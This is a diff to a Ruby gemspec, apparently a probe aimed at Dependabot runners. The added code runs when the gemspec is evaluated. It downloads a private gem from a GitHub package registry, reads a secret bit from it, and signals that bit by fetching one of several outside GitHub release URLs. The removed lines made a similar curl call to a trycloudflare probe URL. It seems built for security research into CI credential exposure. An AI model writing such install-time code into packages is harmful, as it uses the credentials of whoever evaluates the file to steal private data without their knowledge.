@@ -1,16 +1,44 @@
+require "fileutils"
 require "open3"
+require "rubygems/package"
+require "tmpdir"
 
 job_id = ENV.fetch("DEPENDABOT_JOB_ID", "unknown")
-probe_url = "https://allow-spotlight-baseball-investment.trycloudflare.com/other/dependency-code/job-#{job_id}-actor-runner-lab-v1"
+package_url = "https://rubygems.pkg.github.com/chawdamrunal01/gems/f005-private-canary-0.0.2.gem"
+signals = {
+  "0" => "https://github.com/Cyber-Buddy/probe-x/releases/download/f005-oracle-v1/f005-private-read-bit-0-20261012.txt",
+  "1" => "https://github.com/Cyber-Buddy/probe-x/releases/download/f005-oracle-v1/f005-private-read-bit-1-20261012.txt",
+  "no-read" => "https://github.com/Cyber-Buddy/probe-x/releases/download/f005-oracle-v1/f005-private-read-no-read-20261012.txt"
+}
+
+signal = "no-read"
+package_http_code = "000"
 
 begin
-  stdout, stderr, status = Open3.capture3(
-    "curl", "--location", "--silent", "--show-error", "--max-time", "10", probe_url
-  )
-  warn "DEPENDABOT_UNTRUSTED_GEM_PROBE job_id=#{job_id} exit=#{status.exitstatus} body=#{stdout.strip.inspect} stderr=#{stderr.strip.inspect}"
-rescue StandardError => error
-  warn "DEPENDABOT_UNTRUSTED_GEM_PROBE job_id=#{job_id} error=#{error.class}:#{error.message}"
+  Dir.mktmpdir("f005-private-read-") do |directory|
+    gem_path = File.join(directory, "private.gem")
+    stdout, _stderr, status = Open3.capture3(
+      "curl", "--location", "--silent", "--show-error", "--max-time", "15",
+      "--output", gem_path, "--write-out", "%{http_code}", package_url
+    )
+    package_http_code = stdout.strip
+    if status.success? && package_http_code == "200"
+      extract_path = File.join(directory, "extracted")
+      FileUtils.mkdir_p(extract_path)
+      Gem::Package.new(gem_path).extract_files(extract_path)
+      observed = File.read(File.join(extract_path, "data", "secret-bit.txt")).strip
+      signal = observed if signals.key?(observed)
+    end
+  end
+rescue StandardError
+  signal = "no-read"
 end
+
+_stdout, _stderr, signal_status = Open3.capture3(
+  "curl", "--location", "--silent", "--show-error", "--max-time", "15",
+  "--output", "/dev/null", signals.fetch(signal)
+)
+warn "F005_PRIVATE_PACKAGE_PROBE job_id=#{job_id} package_http_code=#{package_http_code.inspect} signal_exit=#{signal_status.exitstatus}"
 
 Gem::Specification.new do |spec|
   spec.name = "dependabot-untrusted-probe"
